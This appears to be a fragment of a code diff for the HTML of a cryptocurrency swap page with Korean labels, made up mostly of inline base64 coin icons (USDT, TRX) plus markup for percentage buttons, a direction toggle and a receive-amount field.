C9EUpRQWJvjj/73H9LocksGPvKLXBgUbKcBQUmtqUlq+vG2iDcxXlO8S/EuyZ+zDJ+l+CTGp13xLhHfjcUnMT7uiiYJmnTxcQefxKJpLJrEolmKpl3UZ6KBig9VdLhfdGQQHwi+HIovh+JrRfEDFfH9FdHhPvFjg+LHBvADFei24expTKa4868QXD1KsmkbyYsnZO/1N3K2HBBunqJbr8hUpc+3p3a8MR70v8db//Ei92E49LWlTfB1Adx7TBDxyd9634d54zXlTdN7kperke0mG5IUh/TpX/45TR44yvivfYS5rXVkZUEpVkVVGKTGTxHSkaKcq5ZolTfRGY7JklhdmhIniaRpjI1TdXGCZhlZmuJTj88y1STFJwk+ScUIarNeDLciVpHAGCiGastlzGAfIiLWWLUWMBZrLVIIsWIhDAmCgFpgqYL85sd/VdfOvJLH3UZG9plPUjjwAc5d16/TyTrbb3srp0mob79aOo3z2Rsm31B8/t1/7V8ti3z/AVVz+OvUNcHXtb57D/nog3/l6mT3rvcPb9nmViol2+ouEZZHtfTkF3j5Zz5C5d3vktY7biE5dRJbqgmdFlILZL44zwk7xi/aELRCZiu4MrhqnkTd64JvL5qR+fxrXiFzHu+9eM1vtubPYq1Va4RQDGHw6pBJrgQo3/vdzkHse9c+J2NHCiE//cjDuj63ghWLT7sgHi42yL70Weztb5evPPaMfnfxdpa37yEwJapBKZhpXXY3br/ue//DH//7G+8XnpGvQ4F9LYB79wrg0+1bflKu2hVVRiaTWZ9a2l2GCjUWfu5nIRHhH/4QG5dPY9qgXRAJEQfaneOBAZHW8CZKOESVUKHwWjGgvteJAeq8ivOqznucKt4rzqtmzpP5/IeMMRpaQxRYDa0hdOYKaOq80s0c7cxpO8toJJk0s4xOlmnHOxreUSuX5fPPHsXPriDLDTQAfAZBgB4/Q7TnknZv2CrnOcUd4U36XJpyc9TH7ix244V6dMuWff9IkPfff0C598/IwoZ773Xl9942oZXa+4aKZe+Ms8naKjaw9D/8KPMf/yT2Rw4QD0XIhQXY6AirDaGxjs7Nw9l5iWZn1fY+fF5QCJkIKUKKaAqaIhp7JfZK13s6ztPJPK3M084cHedJFDIRvAhqzJWlKZAiJF5pO08rc7SSlI1OQqsb0+l0abfbNBtNaTea+GabqlNYb0Cri3QziB3aTdCWI33uCYojwxwdKvC2LJO7RWgBGxTsx5MFvzK09T38/bdvfZ+I4+BB8ycD2PtiMjTxPukbqBdrlWylsw6tdQbjlPYv/Qa+VETfcxvu5CtIKxMaDWg00JUVdGUJlha1vLKedwKvq4ckx1J7LqmaW5s436tQnCd1nixzuRtrPjO3ImqNEPSWySlWvOZVTZI5ummWrywlTlKN44ROkpIkCSSpiHdItQzWQDtBkx5N1s6QFNylBcoLs94Uy/q4n2VEAp7SlC/aGgsLF9L5saGyuePtf10B7rjjTwHwvvscIFmavT+s99EglnZjAUiovfgKC3/0AHzvnSgemW9As6U0NpSNhmqjKayuw+oaxWYL7z1p7paaOa+p81x5jtNM4jSjm6Z04oROktBNU+I0JfOezHlQtEdxijUGaw0igvOONHN0k5RWnNDsxrTimFY3X+24SyuJtZukZF5zniEI1I4M5RErzvIuKPFI4qGVIisZG1/5sgSNVX537o85mS3LOsLTgWHNVUx2+ctoX/j9gOGOO/6EGHjwoEHEh+/af00ahTf2V4ouXZk1pG1KlTL2s1+k2+lgbr8JTl/uNf4KIqgIoqKqIElXiqHVciH6U/lHz6sEDJnmCSRJU1bXGzlyihhjsMYQGNPr1gzFYghAAkQZhElGECeYMMGkqUgcY5zToqqoNZoZ2Do8LIXZulKIUN+jy7wnp3IQMYbs+XPYXafEVYtcTo5ptPPNLGdrKvV+kz3zOaettWs4cOcNiDx1pUb+agAfftgA3uHvYqA/kKLG7bX5AFEGmoM0PnME9m6DegnOzEJUAMlATO5Tqoi1+GaLa8cm+NzJU1xeXkZUxWUZLknJ0pRukpJkmfo4RdWL5uSApK2W9g8M8K677iZOMrCCEcGavN0NraUVx/zy7/4hrUYTigVAcNaQBlbUBih5zEQEF1hMFAjFkNnVBTbv3I6tllHn8szjsvwu+h6X3/Xo088pN79V5l55mfFN17DYXZPMFgjWwoz5pYIdGnyPg6fYs0e+1gLvuMNz5Ai+XLrL9BVY6yxK0tyAQkTx/BKXXzoFH7gbXduAOMnrB/Lgnjf5Hm8MVWu17VJ+7MWv6OzqqnTjDlm7A80WtDqQdKHdgTjO6a12F7pd5eJlxqd38u63vx2vSiDCFQsUEYyxLK1t8Pf/9b+CikBfPxQKQiGCQgHCEEolpVTMwY1CJQp7Xw/Ze8/dMlgq6WKaqQkLol57Bpgq4sEZ8c+fht036OzSKlsvX6YQGsSmlKK6Wb+wgG939r/Ogb4KQOHQIc973lNjqPQGE1porhjttjHlkOzkRbppF9k2BUuriHpIUzQPUL1bmCeNTprwq7/4M4TqUQWLV+N8zjh7zfvVJBMSp+Kcapoh7Q6uXmb4rjvyIZIRrDWE1mCMoKqkzpHFKf233ET73AlkYQFKxTwdCfn7ybO0qDUQWMWafLKH6Isf/z0xLkOKRTTLFFEwqngHseZQXF4Xc/4ybeqkZ09T2LyZVqeNLdXELjZx3c4e9l/fz6FDa71wpEEv/gmHDmmwffiqrBKNhbVqPhXSjFJglZfOCMN9SLWMzs5DGKKZQ4woxoKKYHr5sVrEjw0SbzQQl6mPY3yagE+gHeddQJwocZYHv9TlVugFX4hQY7BKHveMoNpjp1JH13vSKCRZWITzsxAYpdsjKiTvRIgCJYywUQjGKDb3EmONaq0CkZVXqRyPYFTVeZXUQ9chZy8Lk3Wa8wuUBoZYXVshxIqhkGWdxWEqxauAr3DggOHwYRe8Lht7Pzl8Lf1lMYFxadgNCKAUlCQ9fQkmhtAsydlkEcUI2ACMFQkCbBSgoSEtWpicBDsBVkGQqhYZCquM2BIDQZVaVKYeFAlNKMYailgurqxycm0FjKjVHnjknUnmcyFBCkgYyLv/5UEd6++XZL2h8fq6rK2ssL6yxNLKki4vL8na2iquuaHE3Zz+CkMoFAis7ckNvajPwOWkrZjejfSglxdhZCvx0gq1ZhfWG9hyhUK9zyXzs4GJ070evsJCrlXMAbwDOAS6eWIbg0Xcwmpum4WASEI6y+tw1SgkMeIdiIqEIVIuE5RLJLUI11+E/ioD1UG5fmATN5SH2BH1MRiUCETodFNWk47Oxk2W1tdYbTRYWZllfWWJ9lqDxtlLOnr9G4gCS4bHiJA5zduxzGGMwSFIGOqzzz7NyNQWHR0YYmjzFq7avYfhSpXheh8DQYhXz3K7wezyAi+fPyPHL53mxKWzmq0uQ6MJ3Qybhvg0EZIe14jmhdNaE7odabsOk52YoNHKRzDlKhiLBjLztWXMHfcpHMJMbppyxpEEK0gYQKVM5CyNVgvGduV0fCAQGGytTDQ+hN8yqldPbpf9A1N8b22z3GBrrMQbPB0v81jrkj65ck5Or86zMjenfn4NltdhfhVWWsJ6W9noCI0OpCpDN92ikrduOFVcz/pS57De47yitSoX/uAwF5bXoL8O1YpSr0KtCqMjDI5O6MjkFNNbt8neyS183559/LNSDVsI5eHFc/zBiad57PnHNX7heWR2HZpdaMdCluUYrneg22G94NniHNFGC+sVMYEQhZBlWwAYHdXXJxEFMFHfqHZbRIVQkhAwgukImQFqRUi7YMGUChQnBnX0+j38yPZb5W8Wx2UUw+mNJX5s+bN8trSuzeUFOHsJTs/BxTWV5TZ2qY2sJ9DO0MQriUMzp9Lu4sVSD4qoCM5l+J77euc1806UPBsXahXaicJqE+mkiKxCYNAwwIcBK6UCK/UKJ8aG+ez0hHLtDhnasov3BDUOvfFt/J077uWx279P/t3pJ/js7/+W6hMvIosNtKmCR/MZdUzsEozPCNttLBBFAYQWfDIBwJ49XwsghH02ViKnEkclcAE2jXChgUoRwYE12FKR6rZJDs58l/x1OyBkKbEo96wf0VeKy3DpHNGzF5ALq/i1tvpGirY9PjNgQgglZ51trxSyBjUBtVKJzHlJnMtLNedwzovzntBa1EC5WmW1VMSXiirFQl7EW3sl24pJHbLawrQSzOVF9PgpXd77Ir96zw0cX6zIkeKd3I7h2p1v4Ud/dJv8QetfKI+/AJ00zy0ug9ThujEuy9BOFzEWkzjBghSCAQX46XwAnwMYWAVIs8Vq2FqiJgU2wgLYENcN0UoExRDSFLEBPoLh8U3ibUVQiI3BOM+hie+Sw26VL6x9htXqMsgytLtKo4s0UiRWJFWIXT7GzBVriAcfCEmpSF+xqE0M3vsrjA1elXIQUPIpWiigImKsUbEWxORJTQSMwRsRr4pzqaIC1lCsj7B/37vlBzft5lzXQWCY8Whsm9g3XUf23Et5BhdPLotNicRQEEPW6WCvyOtKEWzEJcCiOECC3ARUAcPs+cjPLeGmtiBBhKZgiyVMrZKPFTV7tQdbOnGS5yub9VNd5J2je6AQ8oO+n/1S58s7P8QTY+d5ftcxTr3wosy9dFI3Tp1FZ5eEjabmxXOaW6HTfD5SKLBzyzTPNteYn52XUETFeTDSy/JW+wcHmXnDPi5ubKiuN4Q4UQwQBoZiMY+DgwMUpyZlZMd23bXvOq69bp/csG0X2xMlW2hwvlJlR1jgXzz9aT6lx7Cnz0EmPcZDELGoV4IgROKEbmsDEXBBmucAl4Y9Jv91rVyPuzRn55TFVZLRScQGuaCnVMJUymB77GcSoxtNZp97kQdPXaZx26384cpx3lm9mlsmdjFQLup+CrKvuoPG7q2s7nkH8y6R5U6D+dUVZhcXZH5xnuXZeW2vrNJYW6O9skba6vDI4Y/Jf37icWV5FbqJkKa5ZUVBXjJNjsv0W96sA7fdRikM6R8ZluHRUfpHx9g0Mc7EyBijAwMy3j/AeKEs1Qz1rY5uzK9LA9RZw/zcKf7txS/xYH+X6IVF0j9+LBdiZz4fmYoFtagNpNvtaLzRwCBo2ed4pK+O/b6GUFXOzGbaalGKHRvG4JwXX400HOmni+btUTsW117FmH6OnniGiy+8oKW3v0V+Y+Ckbn/Oy+3FTewb26vTI1NSqFaJM6cmjqUYJ0y5om7u2ywysIXwmpCsVKBcKUskgjOGs0e+gBvfIl6VNE5Q5/Ji0BgKYShRFBBMbeaqv/2T1IKAgvMSebCZp2asDhULUs+5Bm0nXhbaHS5tbHBybUWPrl/gsfQsz00GuOl+Kg89Q/ujn4AsgsSDRxEL1oKNJIgqNNotXGeDJAigZBCvaOqy1xHrBIDivSCizC02fbuF67TzmKyZ+hAKE2NsGBWpRLDuQAVdX8b0D+jS7LzIL/yaRlOTvLhnUl8sPAdf+gTD7YJOm0G2jG5hsH+M0uAgUihL4vPsasNA+keGdVO1xmiprKOFAtfd+Q6KBmohlIHwdXtE9HW3vbEes77eYSNOtOsyRARbiETbLT3faXF6eYmnFuc5vjDHs9kap+oOX+6CjSgdWUKPfInWyQtIVMmZaVWfj0iNUC4JQaB9UYG41YC0i09aOKK8KDd0c4kwoFdaufvuy//abK+y3mRjbU29ToFPaGqTYNc0rJ6Fagk1mgdbJ6rNDTH9NfS67cRn5zH/7QxGLH6oylJ/iaXstDx14ikl9mq6UIvKUosqlGt1alNTDPX1y4XBIR2s9TFYqTE1NsIbts7QUCE0+bycV2cjgCjPvyC5fklVhprzK+vy+r6Oqtxh3WfcinpMB8YusZBJEpkQDsiC8sanL4oOr+inTSGoIBEZeg4xUreM6sRxEB/H9iIWt8Ayy+dBRfjfQImUFAQvwzAh3OxVfB6Kkvb3ctstMnmF3PCQFM63QaDO7cIT59ThmtwXkBNHvwzVJNUAGTzKDoygFvegIUGcmkV4zTvRa3FW8O6rLOuQF8dFs7Qo6LzQfvSCpv33cTnf/V3aDe7qOZDIe893itWDG2X8MP/x0/QbixBuZyHlGKUszKhhcAKnQTTaKhptqDRwndjVWtxfTWlWECMycnaJM37eEwe98Iw3xA0NADFMvVqmTOLFyEEtZmAg2KEBsmF12P2VUMlSbOzqh5/aU6DOEbI6LSXiab2qZytw2CfMFhRmg5IcoVUonkATnpyjEpR2VKExIvvxLDRgY0u0kyg3VWp1CBpQpoguX4Fk2W4QoHa27+LLMlIsgz1SpbXgTm9ZS3rjQ0Jb75BzZOPYc7O5nE7y9A0U5xDPaLWqJYKkpVKSKUCQ0MQ2CsCzVxcaEz+WpD38gRhj180+OFhCTSiaGGjs6xSMlANVAshEllQvfS1rVyvLZFAjgsGd2FOTLOJhE5ct4EpKOXNk9opBrB9BM6vwQagSe5b2RUBs+bRIVMl87lmr1yEKMrBrQ2gURnW16HRRFtd6HbQZhefOrQQkiY5ze96LZzzDucVYwxd75RaDb/eQtcaaKmYg1Ct5P9GFCJRKDkwpkd42J4WMQYjignAGsmTRSCEIRQLSqGA1KtopcaQqRFnDXW+jS1W8f1lcElPSuJf+loAD+eyBdf1xyUKEr+8FthLa5rNWOi2aTQvMrBzBte+hM5sJ3YnMEsBKhv0FFSQ9BT1mquiXiuPeir7vgGk1oe2YvI7XsxryiBAvIJ6QhW887TjhEwz0kzJvCNzijWGxDm0Usp10esbSLGYF9LW5EAFVrEWjMl5SjFCmilxkn+PMYLpWV4YCFGPjC1EQhQi27aCWoY3T3Fp/gQUDVqyaH+ErHcDtXjmNl7I+YMjniOvDZXySN12Z6iWzgPGX1jyBlGyjNX1Mzo8NA1j/Voa35lb4VQfDFShHEJocpLB0JuZkZOVVnLWt28QGRruiSR7oFoLYa+OjxMwQiGMiF2+iaYTOza6CRvdhHaa0k5SYhRzxaLDMAcisDkYgb1yrYQ2d1PvlST/3Rib15JBkIswiwUolfJVr8LgILplC8SO8U0jzJ0/AZUKWi8h1bJqYAwmvMzRl08iwKEef/AqgAcOWI4dS4iCJ6hViE9fUJ8EmBSN4w2CdEPqAzeKKW3HbL0R3TIE4zWoRlCwEPQswUje6BgDToVaHRkezeMkkluGMfmHEQutZi8uBQQitJOUZpyyEecTtisTu653+MBiy+W8sA4DiAIhCnM3jMKcTA1sbnlec7cV0Z515vK3YkEoFqFUhnIJ+qq5d0xvwUdFGaj2k7omG+sr2GIBxvqgaLwUInD6JNDhYwfsqwTMq87cIwjFZw/KYB2dW6a6AEYsaMglaejtdoaCbJXp0lvQTbuQ8Tr0FYVSIITmtU2/1gpehWoVmZi8UomgmPw6DHOLWFnNhzsm16mpQTres9Hp5MBlKbHLiL0nM4IthGi9AoUotyQbgA2UwCphoGqukAr0wCPPzLnVQSFSCoV8I0+9CgP9yMAQ9A1grtsLC2vs3X0Vl04cVUyYh4LRkZx4LUSw0vw8AC++tvH7NQB7Skx/eeXz0l/r4n1gLm1QiYbyNjms8G5f4K9RYTvjhKVt0FeGQkFz65Pe6t2cUhEZm8zDoSePVUge/2yozM0rSVcRk7dr1uBENHX5zDdOU7I01VQ93gpRFKCRRavFHoBWCYwSGgitqrnitgjdbq6asb14V+iVOsWCUC7nPXO1jvQPwOAgMjMtvtYvUSfRscE+Lh47gY1q+GodakNKoRBqLAnPXfpMDyz/9QbrnoMHDSfPn1GnT8jYoNk4f85VgmGMt9Bq8rvSYI8YnmdDxqUPH1qk2HMPMYINBCsQFWFsCozNE4SxYILXSocLF6HdzD+w9MC1ltBY4jQldY7EZSSqOAQCSxAFmEJBTLUCxQAKobwW+wIkCEQQIelVBkGYu2wYvhbzKmXor0G9jvTX0cF+0dFBMW+6Cf/MMfZde42snXgFzQpYKWCmt0KprmyfNLKePsVLZ06iKhzCf31lQl4cogsrvyUDdbKVRbJmRl0H4JWTfHrlC/pp2aDgZlVxFEojUDBIoaQShRAaJYyQiSmkUEKdouZKfxmADeHCJaWxplh7ReaB9qioUqFA5pwk3pEhZIEViQKCYoQpRJRKBXSwAtViHgMDm7stIqgKcZzT82EAQZCPNIsFoVTMC+96FSpVkf5+YWRYGBlRc/M+LbQd0coqb5zeweLJMzpUG6FUHKQytEtkuKKU+9CTFz6Wd2132D9Z2nHkiEOALzz9cXWyLMPD4eorp3SwMIyZn0Oef5ojFz6huzHMrz0l4/Xd+ME6VEtQqSiFErJpGsq1PMQGQZ6VBTQK4fIcLC/1LFbyrqA3CEcsYRCCGHXaU5MGlqhUJCwWCEpFCqUCOtoHlWKeSAKbJy6RnCnpKa562TiPe6Xe5sW+ep4shoeVsVGVyUnl2qso7dwtrf/+CW67+y7s5SUtlmsMhXX6Jqdola3qzusCjl5a5YGjH0UEDh1xf5o6S3sZZoXF1Y/KzLSk62u+3UpkpNCHLi6ycPppVtfPy3Q2wOrFYzI8cyt+UxUZGITtV6HD469N60wOFEEPvNnZPEvmpYyoMWCMSmD0iiuqEbwRJAywUYQJA6JiRLlSlHKxQNBfy29YMYTAihiT83RZeqW+yzNysbfzs1bKZyf9dWSwH8ZGkC1TuJmtlN90i2R/8Bn6x0b4np3XaLcdMzYxxejIJlnxG7i+sotM2XDs5cO0Wgt87GP2/7sp8WtF5vfmRbU+9Mz/o8vN2MxM2/njx3R0cCvlYohJLc/MfUF31GfIVtcxy22Ke28Rd8NeZNc1UBuAckUoFvPyoViCtXU4fy5PMqqa62nQvMTolT+hJS0VCMMAW4gIwkCCQki+ChSKBSZsgU2VCWSoD0qFPDRkSS5Qt0YIbD74KUe5ldZLSF8d6e9DhgZhfAzZuhk/s5Xizbcw9PRLdJ9/hp/8gQ+ydbXF6NgoOzdtYbUQa3NlFjtVt+7zj8T6pcf/PSC8+KL+eVT6nvsPWJaWXubZlz/K+ISlT7IL586xaXAnvmJwScaT8w9x29XvYXH+FUar2zTa9y50605kfByt1iEsoqVyLuM4ewasaF5WiKoVxRjBmh5ZapXA4qKIzAre5p2EyUHBGyFRRbyjqAFUA9FC2NtXkuY1aBhAIYRSJFIsiNQKSK0CA3VkeACZGMXs2IK/eifBnhvYsbgq53//d3n/D/9tPlgb0iAKuHZiE8amPPfcF7HlYqazCzZ96snDPHb2BPff/3U3In79bQ73HlYU0S8+eZ8+fqJpts7YtWMn1KUR2+vTaBiyvDavp5af0LtvPMBlA/cE01Ke2IYfGcDUqmilJKQOTp3MxwF5rFI1V1qvfN8vxgrWCoElLBXYMT4mW7dvZcuObUxtnWbT5ikmxscYq9cJopB1OvkkL8ty67vSiRRCKAS5a9eK+eqvIINVYXgA2TyBv2o7le17ud3BSw/8Nre85738/J5rNOt22TYyTC0QfuvJPxK3soz4gtUHn2nz0JOH0K9vfX+yyBw89x6wzB0+p188+rN+y/ghU6okZz75WXv93W9nZOsQS4tzvHLpWUqrEW+/4V08Gh9jSzQkp8cHND5vkSCAsycgi3MLUZ+3fJlKT7GQi5KszZVdxjI+Ms5vPPqwnnz+BUJrNOvVcqYYIpHo6MwEu/bfLSfXu6obzZ5Vm7yMCW0+9KlFUImgXoaBCjrcr2ZyhGz7JspTM7wzKPHJ85+TW95yF7+8/Y24doIphYyYiL/36U/K/LPPatDInMt8pE8f+3mOPHOKew9YDh9y39g+kWPHcs3gf/3tL0u98v0yNjwmT57IlpOu2bNpF2utVbI5Zf7yKvVKhZnhYZ6+eITRsB83WCZ59GHM8lL+uzLXG/yLYPLsK69aolV1XoJSySwN9/Hg4w9z+uxL8vK5k7xy7mVemT3DqYVznJo/y7Pnj7FKQvr4cbK5BSQw+f64KETKEdQKUC9CXwUG+pDRAczUGNm2KSpX3cj1G7Ecufxlef+Wm/lnfTtZb8cqVthSijj02Of46Cd/T4L1zLuJoZBzl85w+Mkf5OA/zvjIR/Sb2+o1Omo4fiylEx+lXPobUinhvvICa2Uj107tZamZoUObuFSv0DewmavsAMdfepBC7PD9gr98GdpJj5PPBVGCkZwVyXtiFQQr+HaHxic/I/bEaczFWczcMmZ2CXNpETO7gjm3QvOPj+BW13PlhBEhCpBSCNUC1MtoXwUZqCLjgzA5iNs5zdiuW5g6eVKe/dJh3jXzVr47nODoxoaOhEZuKBfl186e4l8+/CmCIFQ3Pak0Wka/dPQHWLl8nNFRw7Fj/psD8NixnGR45EvnQDJG++4xrThNzsyZxuQAM9fcJKuTW/CTU8wWihTLm7l5cDMXvvAZ2utt7I0zoskGLKz1ZA62tznQaA6efVWzKoARK945NHWo86gq6jWfunpFswwT9BQCoYFCgJSi3OpqOYAy2IeMDeCmB7DXX8fU+NWk//13Ze7Ln+IHbv8Aw+1Ij8xeYtvAAHfXqvJwa4Ufuvw8Mt4v3PqGjLVuQT//6L/i6ed+hf37Az71Kfet7dY8dgz27w/4ylNfkGLpWnZMXGu7mnYbHdu6ZkpvmL6Kdv8WUimx5Lus4Lh91z7MpYuy8MjTMLNdgu2jaGMdmglgRa1FxPT4r5yMyVkwyVuyMFCiEClGUIiQQtQTSkbkFL5FiiFSKUC9gPSVoD+PeX5TH1w/zdC+NzN4YZ3Z//hz7MhUPnjP3+HYs6/oo8eOMT02zp1Tm+V8ts4hv6FpX536zpszG9pC/OAjn+G//PaPcvBgwK//uvv27Bc+d045eNDwO/d/UoqVd+i126ZsZSDpZpi1LVXZX6xKENRZlIT28iVOvnSCqzdfJdfumGHlkSdoLq7Cnh3Y8T5IOrkeMPP5HJt8z9urklfpJRgj2julTORKxg5NTp2VI6gWkXoBqhFaCWGshtywhf5bbqTP1dj4nT+Az39OPrT/gLxt9z384UOP6AtzlxgaHZXrrrqaFb8u/3j9Bb11YJofKUw6Z8LC8dPHXix97sHvSR5/tsPDD/Pn2bX+jRw6YRA8/QNb5LqZz/PO/TvM9m2xbh4Otu66Ud4b1fjjsMyxS6fUPP8C/vRZ2dTfz03XXkPnxHGeeuABVqIUpgbVoMjFBfyFJdW1LtITq+eDbc23uNJTnktPKB2aXFMTBVAKoBrCUAnZMoTZvZnCtml0LSM58izlcxe5e99b5e5b3sPc3IoeeeE5VgXaxaJsnZlBgw4PvPQl5Y538j1X3+7fbQh/YWVh9vijR26X7733VE6sif/2n9pxRZ0+OTkj1+/6nDlwzxZ/y554oDoa7urbzlq2jnQ9Lx89qu7kabSxAT6VvXuuYe/UJKsvvqDHHn2US80VGCoKfSUVVcxaG13egPU2dGLVJMtpKSHvXgomZ777i8hQFRmtI5tHkNEBUgng/DIcuyBjCdx1w1v0rW/8LtLE8OSJl2Sp20asVScWX43k3PJpTlw6gdy8l/C9P5JO019YWJ6bX3/mxXdw9zuf+UZPNPqmjz1hz46dsmPrH8k733KVv2Z3TGpCMmW4lVHvH9Cl5UWaZ89DmuF9JhQLumt6mt0DI5TnFzn/wvOcPXNKZjur+NBDySpB2KOnejSNkbw4LoV5/At7hGk3E9a6ykpLBgm4ZtMOvXXfG2XLtt2stVJOX76gq52WRGFIhNXUWrkQL/Hc+Wd0fW4eO7EJf+/bsqgwUUjm5i7qiePfw4cOHb1yhNV3/uCdKyBOT4/L1vHfkzfsfrPs2BnrxVXrGxsmGB1heOcMnVJIe34O180nYj7ONdKD5Qo7+/rZEpWkGHe1sbzC8twcy40VVtoN6aQdUnFkPS+y1hKIoWQjrUcVxuuDsmN6O1u379ShkXFx3uilxSXOLS2QuoxSqUghLEjBBLromhydf07OnjuhDNQxY6OqlSFHEhT0pTMvcPzEe+UTR07pN3kM1Dd/9NMVECcmyjIx+EuydfIDOjHuZamZ6fK61Ylhid5wE4WtW0jiNtnSsmq7g+nGZBsbsLQMa+sUEcaqNcbrffT39ROWShKFAUEYItZSCAKkVKRUrWjUN0hpaIhaVCBNM1bWGywtLbGx0UBQojCigsGJkVXpcKp7Tl9ZOIULS9g7r0fHak5PrlmeuWB59Oh/14ce/GHWWf1WDiL7Vg8fM1f2TJid235Mhwd+RjaP1WgnCefnjC9ERm6+iXD/bbBpRHVuVtzJU3B5UWW9AY0N3MYGrK/1tMvdfPdqVIBSmaCvDxkYINg0Qd/EOLXxMUanJhkpV4mcx+SbZqCbSNhNtauZzPl1TseXdK49hw9LwnW3qX3j9SrFltOTpwr+k4915UsvfNgffuhnv5Ujn765k4u+3umoIBw4YPXRLz4O/hOsta6SSmGGiSFDYyPhiWfEH30O7xxcvQO54XrM+KBo3BBtbCBrTUwnxjjFBIGYMESiCImK+HIJBvoIhoeoDA4wuGkTg339DAUFSh6km9JJY5a1JSfCVTnKRT3VPseGAbn+dopv/2Fqu250ahdDd+b5wH/6kUf1kaPv048/8nEOHjR/3lLlL+YAxv37A44cyQDM1NQP61D9n7Jl0w4KBZhbSlhvCqOjhpv2YW++RmS0pJrE+IUVOHMZzs3BwhLa7uRbKYIQqdYJhocpDg3KwKZN2j88TF9/P1RCVgPHvGmxnjQkbqzA+jKEovbaq5GZmzWKprRKJyQ9w/ILT553jz37s/z4r/0nQPNzcI5k/CU8AtS8TolWN9PTf5dNo/+bbpveytAQFMNMqmXH9LBh26BQsMKGg67C6gasrqOttpAl4DOkGEI5VBmoCPWKegnQ1MByAy7Pwrnz0OioHelH7rha/Xft9QxM2bBjgqCzQOfS+Qv+1MX/zD+8/z9y/vwqqsJ998m34rJ/MYfQHsBy+FURYp1dOz8gkxM/xOT4zTKzE66ehhu2eJkZyYR+9VhjGssi6wv4lQVhYVn0/AJ6fhm9sKxcXoLLi8jiKqyuqaSZUinB5Jjq9TvhjXsC2bHJaBggzQbetB5nfuU3+fGP/7awvqrfxhMr/yKPQZYr26FefWXHlltl0+RfZWjgLkaHr5bN45HZthndNA4jRaTPooXMaaelem5Ref6icuIinL0oLK8JnY4QWku90ptz9OW7Rr1PwB/XtP0AG8v/jfsf//JrUfp+i9z7HTsK+S/iIO4cyI9/3L0qUQDhpqt2MTB8C6XKmymEe8WaKfBDGFPLFV8up+uTGFptaLfzE4+UFmKWVOx5jDyP4ynW1x7j3OyJV0EyAg9+OODOQ+47eYY0f+FHpx84YFlYEL7whex1YF55FLhq8xBBcYQ0HiLRGupKdJ2SpimtuIFPFknTK4f+dr76kwh8+MMB4L+dMe4v60M4iGH//qB3rr58U8fL798fsH9/8DopNf9znqX/jbyXgwjHDshrgqcjcORVN3z98/9i/4vD/6SP/xev5cY99j7uIgAAAABJRU5ErkJggg==" alt="USDT" id="send-coin-img" class="w-7 h-7 rounded-full"><span id="send-coin-name" class="text-base font-bold text-white">USDT</span></div></div>
                     <div class="flex gap-2 pt-1"><button onclick="setSwapPct(25)" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-xs font-bold transition">25%</button><button onclick="setSwapPct(50)" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-xs font-bold transition">50%</button><button onclick="setSwapPct(75)" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 text-xs font-bold transition">75%</button><button onclick="setSwapPct(100)" class="px-3 py-1.5 rounded-lg bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 text-xs font-bold transition">MAX</button></div>
                 </div>
                 <div class="flex justify-center -my-2 relative z-10"><button id="swap-direction-btn" onclick="toggleSwapDirection()" class="w-12 h-12 rounded-xl bg-[#0f172a] border border-slate-800 flex items-center justify-center shadow-lg cursor-pointer hover:bg-slate-800 transition-all active:scale-95" title="방향 전환"><i id="swap-direction-icon" class="fa-solid fa-arrow-down text-blue-400 text-xl transition-transform"></i></button></div>
                 <div class="bg-[#070b14] border border-slate-800/80 rounded-2xl p-5 space-y-3 mt-3 mb-4">
                     <div class="flex items-center justify-between text-sm text-slate-400"><span data-i18n="receive_amount">받는 금액 (예상)</span><span><span data-i18n="bal2">잔액</span>: <span id="trx-bal-swap" class="text-blue-400 font-bold font-mono">0.00</span><span id="recv-bal-suffix"> TRX</span></span></div>
-                    <div class="flex items-center gap-3"><div id="swap-output" class="flex-1 text-3xl sm:text-4xl font-extrabold text-slate-300 font-mono">0.00</div><div class="flex items-center gap-2 bg-slate-800/80 px-4 py-2.5 rounded-xl border border-slate-700/80 shrink-0"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAYAAACOEfKtAAAu0UlEQVR42u28eZhcV3Xu/Vv7DDVX9dytVmueR1uWRzxIYMDGmBiRmwQCIQkhISMJBMgXZJlwk5BAwpdcyExMGIzlDAZjYoyxhUc8ybYsybZkSd2SWj2op5rrDHvdP061rIAhQCDJ9z2c5zlSl1RVfc571l5r7fd994YfH/+pQ/6nXY8C173Ade0Cbf+oP35sCQpyEzucu7Ztc3XHTY6qioj8h09bQZQdzl1sc28C5787CP5Lf/lOMNu37TTb777OijEW/bZg8i6D/ErS+RReWvGdeiqMasZtPtaYrg5DFYhe4GGY69hmYI/dBfb/6wDKtwwzuWnHDrPjpptURM7c3CbofNfSyzf1dBW3FI1/rhOFq7KxHZBaq6jNMKetwIvDwNg4jsO4GYjaepNormZ1vKr2cM3ovlEbPvp/svV95XJ5+mwwd7ND3sRu+18x3OVHms927DBm981x+j7eNbj5taVsurq7fFHfcce+CXzhu4NzD0xbh7xebH7mpu7pEaXx6fO8BQMDBA" alt="TRX" id="recv-coin-img" class="w-7 h-7 rounded-full"><span id="recv-coin-name" class="text-base font-bold text-white">TRX</span></div></div>
+                    <div class="flex items-center gap-3"><div id="swap-output" class="flex-1 text-3xl sm:text-4xl font-extrabold text-slate-300 font-mono">0.00</div><div class="flex items-center gap-2 bg-slate-800/80 px-4 py-2.5 rounded-xl border border-slate-700/80 shrink-0"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAYAAACOEfKtAAAu0UlEQVR42u28eZhcV3Xu/Vv7DDVX9dytVmueR1uWRzxIYMDGmBmRmwQCIQkhISMJBMgXZJlwk5BAwpdcyExMGIzlDAZjYoyxhUc8ybYsybZkSd2SWj2op5rrDHvdP061rIAhQCDJ9z2c5zlSl1RVfc571l5r7fd994YfH/+pQ/6nXY8C173Ade0Cbf+oP35sCQpyEzucu7Ztc3XHTY6qioj8h09bQZQdzl1sc28C5787CP5Lf/lOMNu37TTb777OijEW/bZg8i6D/ErS+RReWvGdeiqMasZtPtaYrg5DFYhe4GGY69hmYI/dBfb/6wDKtwwzuWnHDrPjpptURM7c3CbofNfSyzf1dBW3FI1/rhOFq7KxHZBaq6jNMKetwIvDwNg4jsO4GYjaepNormZ1vKr2cM3ovlEbPvp/svV95XJ5+mwwd7ND3sRu+18x3OVHms927DBm982xtu/jXYObV79kw5ari4OdVw/lS+flYvqzlQZmtgLlMqZcQWcqSKOF